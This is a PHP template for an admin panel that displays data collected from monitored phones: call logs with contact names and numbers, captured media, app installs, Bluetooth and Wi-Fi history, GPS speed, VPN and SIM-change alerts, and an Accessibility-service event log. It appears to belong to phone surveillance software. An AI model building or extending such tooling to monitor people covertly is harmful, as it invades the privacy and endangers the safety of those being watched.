<!-- ═══════════════ PHOTOS & MEDIA ═══════════════ -->
<?php if($mediaRows): ?>
<div class="panel">
  <h3>📸 Photos & Videos — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="display:flex;gap:12px;margin-bottom:12px">
    <span class="pill" style="background:rgba(34,197,94,.15);color:#4ade80">📷 <?= $totalPhotos ?> Photos</span>
    <span class="pill" style="background:rgba(59,130,246,.15);color:#60a5fa">🎥 <?= $totalVideos ?> Videos</span>
  </div>
  <div style="overflow-x:auto;max-height:250px;overflow-y:auto"><table>
    <thead><tr><?php if(!$uid): ?><th>User</th><?php endif; ?><th>Time</th><th>Photos</th><th>Videos</th></tr></thead>
    <tbody>
    <?php foreach($mediaRows as $mr): ?>
      <tr>
        <?php if(!$uid): ?><td><?= ss_admin_h($mr['uname']) ?></td><?php endif; ?>
        <td><?= date('H:i', strtotime($mr['captured_at'])) ?></td>
        <td><?= (int)$mr['photos'] ?></td>
        <td><?= (int)$mr['videos'] ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- ═══════════════ APP CHANGES ═══════════════ -->
<?php if($appChanges): ?>
<div class="panel">
  <h3>📲 App Changes — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="overflow-x:auto;max-height:350px;overflow-y:auto"><table>
    <thead><tr><?php if(!$uid): ?><th>User</th><?php endif; ?><th>Time</th><th>Action</th><th>App</th></tr></thead>
    <tbody>
    <?php foreach($appChanges as $ac):
        $actCol = match($ac['action']) { 'installed' => ['🟢','#4ade80'], 'uninstalled' => ['🔴','#f87171'], 'updated' => ['🔵','#60a5fa'], default => ['•','#94a3b8'] };
    ?>
      <tr>
        <?php if(!$uid): ?><td><?= ss_admin_h($ac['uname']) ?></td><?php endif; ?>
        <td style="white-space:nowrap"><?= date('H:i', strtotime($ac['changed_at'])) ?></td>
        <td><span class="pill" style="background:<?= $actCol[1] ?>22;color:<?= $actCol[1] ?>;font-size:.7rem"><?= $actCol[0] ?> <?= ss_admin_h(ucfirst($ac['action'])) ?></span></td>
        <td><b><?= ss_admin_h($ac['app_name'] ?: $ac['package']) ?></b></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- ═══════════════ BLUETOOTH ═══════════════ -->
<?php if($btUnique): ?>
<div class="panel">
  <h3>🎧 Bluetooth Devices — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="overflow-x:auto;max-height:300px;overflow-y:auto"><table>
    <thead><tr><?php if(!$uid): ?><th>User</th><?php endif; ?><th>Time</th><th>Connected Devices</th></tr></thead>
    <tbody>
    <?php foreach($btUnique as $br):
        $devs = json_decode($br['devices'], true) ?: [];
    ?>
      <tr>
        <?php if(!$uid): ?><td><?= ss_admin_h($br['uname']) ?></td><?php endif; ?>
        <td style="white-space:nowrap"><?= date('H:i', strtotime($br['logged_at'])) ?></td>
        <td><?php if(!$devs): ?><span style="color:var(--mut)">—</span>
        <?php else: foreach($devs as $d):
            $dIcon = match($d['type'] ?? '') { 'audio' => '🎧', 'phone' => '📱', 'computer' => '💻', 'wearable' => '⌚', default => '📡' };
        ?><span class="pill" style="background:rgba(99,102,241,.15);color:#818cf8;font-size:.7rem"><?= $dIcon ?> <?= ss_admin_h($d['name'] ?? '?') ?></span>
        <?php endforeach; endif; ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- ═══════════════ PRIVACY & SECURITY LOG ═══════════════ -->
<?php if($privacyEvents): ?>
<div class="panel">
  <h3>🔐 Privacy & Security Events — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="overflow-x:auto;max-height:350px;overflow-y:auto"><table>
    <thead><tr><?php if(!$uid): ?><th>User</th><?php endif; ?><th>Time</th><th>Event</th><th>Detail</th></tr></thead>
    <tbody>
    <?php foreach($privacyEvents as $pe):
        $peStyle = match($pe['event_type']) {
            'vpn_on' => ['🛡️','#f87171','VPN Active'],
            'headphone_on' => ['🎧','#c084fc','Headphone'],
            'usb_on' => ['🔌','#fb923c','USB Connected'],
            'cast_on' => ['📺','#f472b6','Screen Cast'],
            'screenshot' => ['📸','#60a5fa','Screenshot'],
            'new_wifi' => ['📶','#4ade80','New Wi-Fi'],
            'sim_change' => ['🔄','#f87171','SIM Changed'],
            default => ['•','#94a3b8',$pe['event_type']],
        };
    ?>
      <tr>
        <?php if(!$uid): ?><td><?= ss_admin_h($pe['uname']) ?></td><?php endif; ?>
        <td style="white-space:nowrap"><?= date('H:i', strtotime($pe['event_at'])) ?></td>
        <td><span class="pill" style="background:<?= $peStyle[1] ?>22;color:<?= $peStyle[1] ?>;font-size:.7rem"><?= $peStyle[0] ?> <?= ss_admin_h($peStyle[2]) ?></span></td>
        <td style="color:var(--mut)"><?= ss_admin_h($pe['detail'] ?: '—') ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- ═══════════════ WI-FI HISTORY ═══════════════ -->
<?php if($contactLog): ?>
<div class="panel">
  <h3>📞 Contact Usage — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="overflow-x:auto;max-height:400px;overflow-y:auto"><table>
    <thead><tr><?php if(!$uid): ?><th>User</th><?php endif; ?><th>Contact</th><th>Number</th><th>Type</th><th>Time</th><th>Duration</th></tr></thead>
    <tbody>
    <?php foreach($contactLog as $cl):
        $typeEmoji = match($cl['call_type']) { 'incoming'=>'📥','outgoing'=>'📤','missed'=>'❌','rejected'=>'🚫', default=>'📞' };
        $durMin = (int)$cl['duration']; $durStr = $durMin >= 60 ? floor($durMin/60).'m '.($durMin%60).'s' : $durMin.'s';
    ?>
      <tr>
        <?php if(!$uid): ?><td><?= ss_admin_h($cl['uname']) ?></td><?php endif; ?>
        <td><b><?= ss_admin_h($cl['contact_name']) ?></b></td>
        <td style="color:var(--mut);font-size:.75rem"><?= ss_admin_h($cl['phone_number'] ?? '') ?></td>
        <td><?= $typeEmoji ?> <?= ss_admin_h($cl['call_type']) ?></td>
        <td style="white-space:nowrap"><?= date('H:i:s', strtotime($cl['call_time'])) ?></td>
        <td><?= $durStr ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<?php if($wifiHist): ?>
<div class="panel">
  <h3>📶 Wi-Fi Connections — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="overflow-x:auto"><table>
    <thead><tr><?php if(!$uid): ?><th>User</th><?php endif; ?><th>Network</th><th>First Seen</th><th>Last Seen</th><th>Status</th></tr></thead>
    <tbody>
    <?php foreach($wifiHist as $wh): ?>
      <tr>
        <?php if(!$uid): ?><td><?= ss_admin_h($wh['uname']) ?></td><?php endif; ?>
        <td><b><?= ss_admin_h($wh['ssid']) ?></b></td>
        <td style="white-space:nowrap"><?= date('d M H:i', strtotime($wh['first_seen'])) ?></td>
        <td style="white-space:nowrap"><?= date('H:i', strtotime($wh['last_seen'])) ?></td>
        <td><?php if((int)$wh['is_new']): ?><span class="pill" style="background:rgba(249,115,22,.15);color:#fb923c;font-size:.7rem">🆕 New network</span><?php else: ?><span style="color:var(--mut)">Known</span><?php endif; ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- ═══════════════ GPS SPEED ═══════════════ -->
<?php if($speedData): ?>
<div class="panel">
  <h3>🚗 Movement Speed — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="font-size:.75rem;color:var(--mut);margin-bottom:8px">Speed from GPS — walking (~5 km/h), driving (~40-80 km/h)</div>
  <div style="overflow-x:auto;max-height:300px;overflow-y:auto"><table>
    <thead><tr><th>Time</th><th>Speed</th><th>Mode</th><th>Accuracy</th></tr></thead>
    <tbody>
    <?php foreach($speedData as $sd):
        $spd = round((float)$sd['speed'] * 3.6, 1); // m/s to km/h
        $mode = $spd < 2 ? 'Stationary' : ($spd < 8 ? '🚶 Walking' : ($spd < 25 ? '🚲 Cycling' : ($spd < 120 ? '🚗 Driving' : '✈️ Flying')));
        $modeCol = $spd < 2 ? '#94a3b8' : ($spd < 8 ? '#4ade80' : ($spd < 25 ? '#60a5fa' : ($spd < 120 ? '#fb923c' : '#f87171')));
    ?>
      <tr>
        <td style="white-space:nowrap"><?= date('H:i', strtotime($sd['recorded_at'])) ?></td>
        <td><b><?= $spd ?> km/h</b></td>
        <td><span class="pill" style="background:<?= $modeCol ?>22;color:<?= $modeCol ?>;font-size:.7rem"><?= $mode ?></span></td>
        <td style="color:var(--mut)">±<?= (int)round((float)($sd['accuracy'] ?? 0)) ?>m</td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- ═══════════════ ACCESSIBILITY EVENT LOG ═══════════════ -->
<div class="panel">
  <h3>👁️ Accessibility Event Log</h3>
  <?php if($accStats): ?>
    <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px">
      <?php foreach($accStats as $type=>$cnt): [$ico,$col,$label] = evt_style($type); ?>
        <a href="?user=<?= $uid ?>&day=<?= ss_admin_h($day) ?>&type=<?= ss_admin_h($type) ?>" class="pill" style="background:<?= $col ?>22;color:<?= $col ?>;text-decoration:none<?= $typeFilter===$type?';outline:2px solid '.$col:'' ?>"><?= $ico ?> <?= ss_admin_h($label) ?> · <?= $cnt ?></a>
      <?php endforeach; ?>
      <?php if($typeFilter !== ''): ?>
        <a href="?user=<?= $uid ?>&day=<?= ss_admin_h($day) ?>" class="pill" style="background:rgba(100,116,139,.15);color:#94a3b8;text-decoration:none">✕ Clear</a>
      <?php endif; ?>
    </div>
  <?php endif; ?>
  <?php if(!$accRows): ?>
    <div class="empty">No accessibility events<?= $typeFilter ? ' for this filter' : '' ?>. Needs Accessibility enabled + latest APK.</div>
  <?php else: ?>
    <div style="overflow-x:auto;max-height:500px;overflow-y:auto"><table>
      <thead><tr><?php if(!$uid): ?><th>User</th><?php endif; ?><th>Time</th><th>Type</th><th>App</th><th>Detail</th></tr></thead>
      <tbody>
      <?php foreach($accRows as $r):
          [$ico,$col,$label] = evt_style($r['event_type']);
          $appShort = preg_replace('/^com\.([\w]+\.)?/', '', $r['package']);
      ?>
        <tr>
          <?php if(!$uid): ?><td><?= ss_admin_h($r['uname']) ?></td><?php endif; ?>
          <td style="white-space:nowrap"><?= date('H:i:s', strtotime($r['event_at'])) ?></td>
          <td><span class="pill" style="background:<?= $col ?>22;color:<?= $col ?>;font-size:.7rem"><?= $ico ?> <?= ss_admin_h($label) ?></span></td>
          <td><b><?= ss_admin_h($appShort) ?></b></td>
          <td style="max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--mut)"><?= ss_admin_h($r['detail'] ?: '—') ?></td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table></div>
  <?php endif; ?>
</div>

<?php require __DIR__ . '/_foot_viewer.php';
